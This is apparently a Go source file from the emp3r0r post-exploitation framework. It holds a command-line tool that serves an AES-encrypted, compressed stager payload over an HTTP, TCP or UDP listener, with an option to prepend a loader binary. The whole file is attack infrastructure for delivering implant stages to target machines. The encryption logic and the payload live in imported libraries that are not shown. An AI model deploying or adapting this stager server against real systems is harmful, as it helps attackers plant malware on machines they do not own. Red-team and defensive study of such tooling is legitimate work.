package main

import (
	"flag"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/lib/listener"
)

func main() {
	stagerPath := flag.String("stager", "", "path to the stager file to serve")
	port := flag.String("port", "8080", "port to serve the stager file on")
	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
	loaderPath := flag.String("loader", "", "optional path to loader.bin to prepend before encrypted payload")
	listenerType := flag.String("type", "http", "listener type: http, tcp, or udp")
	flag.Parse()

	if *stagerPath == "" {
		logging.Fatal("stager file path is required")
	}

	if *loaderPath != "" {
		if err := os.Setenv("EMP3R0R_STAGE1_LOADER", *loaderPath); err != nil {
			logging.Fatalf("failed to set loader env: %v", err)
		}
	}

	switch *listenerType {
	case "http":
		listener.HTTPAESCompressedListener(*stagerPath, *port, *keyStr, true)
	case "tcp":
		listener.TCPAESCompressedListener(*stagerPath, *port, *keyStr, true)
	case "udp":
		listener.UDPAESCompressedListener(*stagerPath, *port, *keyStr, true)
	default:
		logging.Fatalf("Unknown listener type: %s (supported: http, tcp, udp)", *listenerType)
	}
}
